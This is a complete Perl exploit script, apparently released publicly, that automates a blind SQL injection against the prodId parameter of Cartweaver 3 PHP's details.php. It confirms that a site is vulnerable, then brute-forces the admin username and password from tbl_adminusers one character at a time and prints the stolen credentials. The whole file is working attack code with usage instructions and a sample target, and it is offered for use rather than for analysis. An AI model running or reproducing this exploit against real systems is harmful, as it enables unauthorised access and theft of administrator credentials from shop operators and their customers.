#!/usr/bin/perl
######################
#
#Cartweaver 3 PHP Blind SQL Injection Substring Vulnerability
#
######################
#
#Bug by: h0yt3r
#
#Dork: n/a (brainusing required)
#
##
###Releasing it to the public
##
#
#No error messages are being returned.
#Exploit need a vaild Product ID!
#
#SQL Injection:
#http://[target]/[path]/details.php?prodId=[SQL]
#
##
#Gr33tz go to:
#b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team
#
################
use LWP::UserAgent;
my $userAgent = LWP::UserAgent->new;

usage();

$server = $ARGV[0];
$dir = $ARGV[1];
$prod_id =$ARGV[2];


print"\n";
if (!$dir) { die "Read Usage!\n"; }


$filename ="details.php";

my $vulnCheck = "http://".$server.$dir.$filename;

my @Daten = ("61","62","63","64","65","66","67","68","69","6A","6B","6C","6D","6E","6F","70","71","72","73","74","75","76","77","78","79","7A","3A","5F","31","32","33","34","35","36","37","38","39","30","21","23","2B","28","29","40","2D","F5","25","26","2F","3F");

print"[x]Connecting:";
my $goodSite = $vulnCheck."?prodId=".$prod_id." AND 1=1";
my $badSite = $vulnCheck."?prodId=".$prod_id." AND 1=0";

my $Attack1= $userAgent->get($goodSite);
my $Attack2= $userAgent->get($badSite);
if($Attack1->is_success)
{
    print " Connected \n";
    print "[x]Vulnerable Check: ";
    
    if($Attack2->content =~ m/No product selected./i && $Attack1->content !~ m/No product selected./i)
        { print "Vulnerable! \n"; }
    else
        { print "Not Vulnerable or wrong Product ID"; exit;}
}

else
{
    print " Connection Failed to ".$goodSite."";
    exit;
}


my $hex="";
my $length;

print "[x]Bruteforcing Length \n";

my $lengthCounter = 1;
while(1)
{
    my $url = "".$vulnCheck."?prodId=".$prod_id."%20and%20LENGTH((select%20concat(admin_username,0x3a,admin_password)%20from%20tbl_adminusers%20limit%200,1))=".$lengthCounter."";
    my $Attack= $userAgent->get($url);
    my $content = $Attack->content;
    if($content !~ m/No product selected./i)
        { $length=$lengthCounter; last; }
    else
        { $lengthCounter++; }
}

print "[x]Injecting Black Magic \n";

for($b=1;$b<=$length;$b++)
{
    for(my $u=0;$u<53;$u++)
    {    
        
        my $url = "".$vulnCheck."?prodId=".$prod_id."%20and%20substring((select%20concat(admin_username,0x3a,admin_password)%20from%20tbl_adminusers%20limit%200,1),".$b.",1)%20like%200x".$Daten[$u]."";
        my $Attack= $userAgent->get($url);
        my $content = $Attack->content;            
        if($content !~ m/No product selected./i)
        {            
            print "[x]Found Char ".$Daten[$u]."\n";            
            $hex=$hex.$Daten[$u];
            last;    
        }

    }
}

print "[x]Converting \n";
my $a_str = hex_to_ascii($hex);

@login = split(/\:/, $a_str);

print "[x]Success! \n";
print "     Username: $login[0]\n";
print "     Password: $login[1]";



sub hex_to_ascii ($)
{        
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}



sub usage()
{
    print q
    {
    ######################################################
            Cartweaver 3 Remote Blind SQL Injection Exploit    
                          -Written by h0yt3r-                
    Usage: cartweaver.pl [Server] [Path] [Product ID]
    Sample:
    perl Cartweaver.pl www.site.com /cartweaver/ 13
    ######################################################
    };

} 